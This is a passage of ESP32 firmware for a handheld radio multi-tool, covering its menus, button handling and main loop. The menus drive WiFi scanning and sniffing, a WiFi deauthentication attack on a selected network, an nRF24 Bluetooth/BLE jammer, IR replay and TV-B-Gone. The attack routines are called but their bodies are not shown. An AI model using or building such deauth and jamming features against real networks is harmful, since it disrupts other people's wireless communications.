  if (irTxScroll == IR_SLOTS_COUNT)
  {
    display.fillRect(0, yb - 1, SCREEN_WIDTH, 9, SSD1306_WHITE);
    display.setTextColor(SSD1306_BLACK);
    display.setCursor(2, yb);
    display.print(">");
  }
  else
  {
    display.setTextColor(SSD1306_WHITE);
  }
  display.setCursor(12, yb);
  display.println("Back");
  display.display();
}

void drawTvbgone()
{
  display.clearDisplay();
  drawHeader("TV-B-Gone");
  display.setCursor(10, 20);
  display.println("Region:");
  display.setCursor(30, 30);
  if (tvbgone_region == 0)
    display.println("NA");
  else
    display.println("EU");
  display.setCursor(10, 45);
  display.println("Action: Power");
  display.setCursor(2, 56);
  display.println("UP/DOWN=Reg  OK=Send");
  display.display();
}

void drawSettingsMenu()
{
  display.clearDisplay();
  drawHeader("Settings");
  const char* items[] = {"Info", "Timeout", "Reset", "Reboot", "Back"};
  for (int i = 0; i < SETTINGS_SIZE; i++)
  {
    drawItem(items[i], i == settingsIdx, i);
  }
  display.display();
}

void drawSysInfo()
{
  display.clearDisplay();
  drawHeader("System Info");
  display.setCursor(2, 14);
  display.printf("Chip: ESP32");
  display.setCursor(2, 24);
  display.printf("Flash: %d MB", ESP.getFlashChipSize() / 1048576);
  display.setCursor(2, 34);
  display.printf("Heap: %d KB", ESP.getFreeHeap() / 1024);
  display.setCursor(2, 44);
  display.printf("Uptime: %ds", (millis() - deviceBootTime) / 1000);
  display.setCursor(2, 54);
  display.printf("nRF24: %s", nrfOk ? "OK" : "FAIL");
  display.setCursor(2, 60);
  display.println("Press=back");
  display.display();
}

void drawTimeoutMenu()
{
  display.clearDisplay();
  drawHeader("Display Timeout");
  const char* opts[] = {"Off", "10s", "30s", "1min", "5min"};
  int vals[] = {0, 10, 30, 60, 300};
  int idx = 0;
  for (int i = 0; i < 5; i++)
  {
    if (vals[i] == timeoutVal) idx = i;
  }
  display.setCursor(30, 30);
  display.printf("Timeout: %s", opts[idx]);
  display.setCursor(2, 56);
  display.println("UP/DOWN=chg  OK=save");
  display.display();
}

void drawResetConfirm()
{
  display.clearDisplay();
  drawHeader("Reset Device!");
  display.setCursor(15, 25);
  display.println("Reset ALL?");
  display.setCursor(15, 37);
  display.println("UP=YES  DOWN=NO");
  display.display();
}

void drawRebootConfirm()
{
  display.clearDisplay();
  drawHeader("Reboot");
  display.setCursor(15, 30);
  display.println("Reboot?");
  display.setCursor(15, 42);
  display.println("UP=YES  DOWN=NO");
  display.display();
}

// ========================== ОБРАБОТКА КНОПОК ==========================
void handleButtons()
{
  static bool okWasPressed = false;
  static unsigned long longPressStart = 0;
  bool okNow = btnOk();
  if (okNow && !okWasPressed)
  {
    longPressStart = millis();
    okWasPressed = true;
  }
  if (okNow && okWasPressed && (millis() - longPressStart) >= LONG_PRESS_MS && !longPressDetected)
  {
    longPressDetected = true;
    if (appState == STATE_NRF24_JAMMER && nrfOk)
    {
      if (jamming)
      {
        stopJammer();
        appState = STATE_NRF24_MENU;
        needRedraw = true;
        okWasPressed = false;
        longPressDetected = false;
        return;
      }
      else
      {
        if (jammerMode == BLE_JAMMER_MODE)
          jammerMode = BLUETOOTH_JAMMER_MODE;
        else
          jammerMode = BLE_JAMMER_MODE;
        if (jammerMode == BLE_JAMMER_MODE)
          showMsg("Mode: BLE");
        else
          showMsg("Mode: Bluetooth");
        needRedraw = true;
      }
    }
    delay(200);
    okWasPressed = false;
    longPressDetected = false;
    return;
  }
  if (!okNow && okWasPressed && !longPressDetected)
  {
    okWasPressed = false;
  }
  if (!okNow)
  {
    okWasPressed = false;
    longPressDetected = false;
  }
}

// ========================== ОБНОВЛЕНИЕ ДИСПЛЕЯ ==========================
void updateDisplay()
{
  if (!displayOn) return;
  if (statusMsg != "" && millis() - statusMsgTime < 1500)
  {
    display.clearDisplay();
    display.setCursor(20, 28);
    display.println(statusMsg);
    display.display();
    return;
  }
  switch (appState)
  {
    case STATE_MAIN_MENU: drawMainMenu(); break;
    case STATE_WIFI_MENU: drawWifiMenu(); break;
    case STATE_WIFI_SCAN: drawWifiScan(); break;
    case STATE_WIFI_SPECTRUM: drawWifiSpectrum(); break;
    case STATE_WIFI_ACTIONS: drawWifiActions(); break;
    case STATE_WIFI_INFO: drawWifiInfo(); break;
    case STATE_NRF24_MENU: drawNrfMenu(); break;
    case STATE_NRF24_SPECTRUM: drawNrfSpectrum(); break;
    case STATE_NRF24_JAMMER: drawNrfJammer(); break;
    case STATE_IR_MENU: drawIrMenu(); break;
    case STATE_IR_CAPTURE: drawIrCapture(); break;
    case STATE_IR_TRANSMIT: drawIrTransmit(); break;
    case STATE_TVBGONE: drawTvbgone(); break;
    case STATE_SETTINGS_MENU: drawSettingsMenu(); break;
    case STATE_SYSTEM_INFO: drawSysInfo(); break;
    case STATE_TIMEOUT: drawTimeoutMenu(); break;
    case STATE_RESET_CONFIRM: drawResetConfirm(); break;
    case STATE_REBOOT_CONFIRM: drawRebootConfirm(); break;
    default: break;
  }
  needRedraw = false;
}

// ========================== ГЛАВНЫЙ ЦИКЛ ==========================
void loop()
{
  handleButtons();

  bool up = btnUp();
  bool down = btnDown();
  bool ok = btnOk() && !longPressDetected;

  if (!displayOn && (up || down || ok))
  {
    setPower(true);
    lastActivityTime = millis();
    needRedraw = true;
    delay(100);
    up = false;
    down = false;
    ok = false;
  }
  if ((up || down || ok) && displayOn)
  {
    lastActivityTime = millis();
    needRedraw = true;
  }

  // Обработка UP
  if (up)
  {
    switch (appState)
    {
      case STATE_MAIN_MENU:
        mainIdx = (mainIdx - 1 + MAIN_SIZE) % MAIN_SIZE;
        break;
      case STATE_WIFI_MENU:
        wifiMenuIdx = (wifiMenuIdx - 1 + WIFI_MENU_SIZE) % WIFI_MENU_SIZE;
        break;
      case STATE_WIFI_SCAN:
        if (!wifiScanning)
        {
          int sz = wifiList.size();
          if (wifiSelectedIdx == -1)
          {
            if (sz > 0) wifiSelectedIdx = sz - 1;
          }
          else
          {
            int newIdx = wifiSelectedIdx - 1;
            if (newIdx >= 0) wifiSelectedIdx = newIdx;
            else if (newIdx == -1) wifiSelectedIdx = -1;
          }
        }
        break;
      case STATE_WIFI_ACTIONS:
        wifiActionIdx = (wifiActionIdx - 1 + WIFI_ACTIONS_SIZE) % WIFI_ACTIONS_SIZE;
        break;
      case STATE_NRF24_MENU:
        nrfMenuIdx = (nrfMenuIdx - 1 + NRF_MENU_SIZE) % NRF_MENU_SIZE;
        break;
      case STATE_IR_MENU:
        irMenuIdx = (irMenuIdx - 1 + IR_MENU_SIZE) % IR_MENU_SIZE;
        break;
      case STATE_IR_TRANSMIT:
        irTxScroll = (irTxScroll - 1 + IR_SLOTS_COUNT + 1) % (IR_SLOTS_COUNT + 1);
        break;
      case STATE_SETTINGS_MENU:
        settingsIdx = (settingsIdx - 1 + SETTINGS_SIZE) % SETTINGS_SIZE;
        break;
      case STATE_TIMEOUT:
      {
        int opts[] = {0, 10, 30, 60, 300};
        int idx = 0;
        for (int i = 0; i < 5; i++) if (opts[i] == timeoutVal) idx = i;
        idx = (idx - 1 + 5) % 5;
        timeoutVal = opts[idx];
        needRedraw = true;
        break;
      }
      case STATE_TVBGONE:
        tvbgone_region = !tvbgone_region;
        delay(200);
        break;
      case STATE_RESET_CONFIRM:
        EEPROM.begin(EEPROM_SIZE_BYTES);
        for (int i = 0; i < EEPROM_SIZE_BYTES; i++) EEPROM.write(i, 0xFF);
        EEPROM.commit();
        EEPROM.end();
        delay(500);
        ESP.restart();
        break;
      case STATE_REBOOT_CONFIRM:
        ESP.restart();
        break;
      default:
        break;
    }
    delay(150);
  }

  // Обработка DOWN
  if (down)
  {
    switch (appState)
    {
      case STATE_MAIN_MENU:
        mainIdx = (mainIdx + 1) % MAIN_SIZE;
        break;
      case STATE_WIFI_MENU:
        wifiMenuIdx = (wifiMenuIdx + 1) % WIFI_MENU_SIZE;
        break;
      case STATE_WIFI_SCAN:
        if (!wifiScanning)
        {
          int sz = wifiList.size();
          if (wifiSelectedIdx == -1)
          {
            if (sz > 0) wifiSelectedIdx = 0;
          }
          else
          {
            int newIdx = wifiSelectedIdx + 1;
            if (newIdx < sz) wifiSelectedIdx = newIdx;
            else if (newIdx == sz) wifiSelectedIdx = -1;
          }
        }
        break;
      case STATE_WIFI_ACTIONS:
        wifiActionIdx = (wifiActionIdx + 1) % WIFI_ACTIONS_SIZE;
        break;
      case STATE_NRF24_MENU:
        nrfMenuIdx = (nrfMenuIdx + 1) % NRF_MENU_SIZE;
        break;
      case STATE_IR_MENU:
        irMenuIdx = (irMenuIdx + 1) % IR_MENU_SIZE;
        break;
      case STATE_IR_TRANSMIT:
        irTxScroll = (irTxScroll + 1) % (IR_SLOTS_COUNT + 1);
        break;
      case STATE_SETTINGS_MENU:
        settingsIdx = (settingsIdx + 1) % SETTINGS_SIZE;
        break;
      case STATE_TIMEOUT:
      {
        int opts[] = {0, 10, 30, 60, 300};
        int idx = 0;
        for (int i = 0; i < 5; i++) if (opts[i] == timeoutVal) idx = i;
        idx = (idx + 1) % 5;
        timeoutVal = opts[idx];
        needRedraw = true;
        break;
      }
      case STATE_TVBGONE:
        tvbgone_region = !tvbgone_region;
        delay(200);
        break;
      case STATE_RESET_CONFIRM:
      case STATE_REBOOT_CONFIRM:
        appState = STATE_SETTINGS_MENU;
        needRedraw = true;
        break;
      default:
        break;
    }
    delay(150);
  }

  // Обработка OK (короткое нажатие)
  if (ok)
  {
    switch (appState)
    {
      case STATE_MAIN_MENU:
        switch (mainIdx)
        {
          case 0: appState = STATE_WIFI_MENU; wifiMenuIdx = 0; break;
          case 1: appState = STATE_NRF24_MENU; nrfMenuIdx = 0; break;
          case 2: appState = STATE_IR_MENU; irMenuIdx = 0; break;
          case 3: appState = STATE_SETTINGS_MENU; settingsIdx = 0; break;
        }
        break;
      case STATE_WIFI_MENU:
        switch (wifiMenuIdx)
        {
          case 0:
            startWifiScan();
            appState = STATE_WIFI_SCAN;
            break;
          case 1:
            wifiSpectrumActive = true;
            totalPackets = 0;
            memset(wifiPackets, 0, sizeof(wifiPackets));
            memset(wifiSmooth, 0, sizeof(wifiSmooth));
            currentWifiChan = 1;
            esp_wifi_set_channel(currentWifiChan, WIFI_SECOND_CHAN_NONE);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type)
            {
              if (!wifiSpectrumActive) return;
              wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
              int ch = pkt->rx_ctrl.channel;
              if (ch >= 1 && ch <= WIFI_CHANNELS) wifiPackets[ch]++;
            });
            appState = STATE_WIFI_SPECTRUM;
            break;
          case 2:
            appState = STATE_MAIN_MENU;
            break;
        }
        break;
      case STATE_WIFI_SCAN:
        if (!wifiScanning)
        {
          if (wifiSelectedIdx == -1) appState = STATE_WIFI_MENU;
          else if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size())
            appState = STATE_WIFI_ACTIONS;
        }
        break;
      case STATE_WIFI_ACTIONS:
        switch (wifiActionIdx)
        {
          case 0: appState = STATE_WIFI_INFO; break;
          case 1:
            deauthActive = true;
            memcpy(targetBSSID, wifiList[wifiSelectedIdx].bssid, 6);
            targetChan = wifiList[wifiSelectedIdx].channel;
            showMsg("Deauth started");
            break;
          case 2:
            deauthActive = false;
            targetChan = 0;
            showMsg("Deauth stopped");
            appState = STATE_WIFI_SCAN;
            break;
          case 3:
            appState = STATE_WIFI_SCAN;
            break;
        }
        break;
      case STATE_WIFI_INFO:
        appState = STATE_WIFI_ACTIONS;
        break;
      case STATE_WIFI_SPECTRUM:
        wifiSpectrumActive = false;
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_STA);
        appState = STATE_WIFI_MENU;
        break;
      case STATE_NRF24_MENU:
        switch (nrfMenuIdx)
        {
          case 0:
            nrfCalibrated = false;
            appState = STATE_NRF24_SPECTRUM;
            break;
          case 1:
            if (nrfOk) appState = STATE_NRF24_JAMMER;
            else showMsg(nrfErrorMsg.c_str());
            break;
          case 2:
            recheckNRF24();
            break;
          case 3:
            appState = STATE_MAIN_MENU;
            break;
        }
        break;
      case STATE_NRF24_SPECTRUM:
        appState = STATE_NRF24_MENU;
        break;
      case STATE_NRF24_JAMMER:
        if (!jamming && nrfOk) startJammer();
        else if (jamming) { stopJammer(); appState = STATE_NRF24_MENU; }
        break;
      case STATE_IR_MENU:
        switch (irMenuIdx)
        {
          case 0:
            irCapturing = true;
            irTempReady = false;
            irTimeout = millis() + 15000;
            if (irRx) irRx->resume();
            appState = STATE_IR_CAPTURE;
            break;
          case 1:
            irTxScroll = 0;
            appState = STATE_IR_TRANSMIT;
            break;
          case 2:
            eraseAllIrSlots();
            appState = STATE_IR_MENU;
            break;
          case 3:
            appState = STATE_TVBGONE;
            break;
          case 4:
            appState = STATE_MAIN_MENU;
            break;
        }
        break;
      case STATE_IR_CAPTURE:
        if (irTempReady)
        {
          int freeSlot = -1;
          for (int i = 0; i < IR_SLOTS_COUNT; i++)
          {
            if (!irSlots[i].isValid) { freeSlot = i; break; }
          }
          if (freeSlot == -1) freeSlot = curIrSlot;
          curIrSlot = freeSlot;
          irSlots[curIrSlot].rawLength = tempRawLen;
          memcpy(irSlots[curIrSlot].rawBuffer, tempRaw, tempRawLen * 2);
          irSlots[curIrSlot].protocolName = tempProto;
          irSlots[curIrSlot].isValid = true;
          saveIrSlots();
          irTempReady = false;
        }
        appState = STATE_IR_MENU;
        break;
      case STATE_IR_TRANSMIT:
        if (irTxScroll == IR_SLOTS_COUNT) appState = STATE_IR_MENU;
        else if (irSlots[irTxScroll].isValid) sendIr(irTxScroll);
        break;
      case STATE_TVBGONE:
        tvbgone_menu();
        break;
      case STATE_SETTINGS_MENU:
        switch (settingsIdx)
        {
          case 0: appState = STATE_SYSTEM_INFO; break;
          case 1: timeoutVal = displayTimeoutSec; appState = STATE_TIMEOUT; break;
          case 2: appState = STATE_RESET_CONFIRM; break;
          case 3: appState = STATE_REBOOT_CONFIRM; break;
          case 4: appState = STATE_MAIN_MENU; break;
        }
        break;
      case STATE_SYSTEM_INFO:
        appState = STATE_SETTINGS_MENU;
        break;
      case STATE_TIMEOUT:
        displayTimeoutSec = timeoutVal;
        saveTimeout();
        appState = STATE_SETTINGS_MENU;
        break;
      default:
        break;
    }
    delay(200);
  }

  // Таймаут дисплея
  if (displayOn && displayTimeoutSec > 0 && (millis() - lastActivityTime) > (displayTimeoutSec * 1000UL))
  {
    setPower(false);
  }

  // Фоновые задачи
  if (appState == STATE_WIFI_SPECTRUM && wifiSpectrumActive) updateWifiSpectrum();
  if (appState == STATE_NRF24_SPECTRUM && nrfOk) updateNrfSpectrum();
  if (appState == STATE_NRF24_JAMMER && jamming && nrfOk && millis() - lastJamTime > JAM_INTERVAL_MS) updateJammer();
  if (deauthActive && targetChan != 0 && millis() - lastDeauthTime > 100)
  {
    sendDeauth();
    lastDeauthTime = millis();
  }
  if (appState == STATE_IR_CAPTURE && irCapturing) processIrCapture();

  if (needRedraw && displayOn) updateDisplay();
  delay(5);
}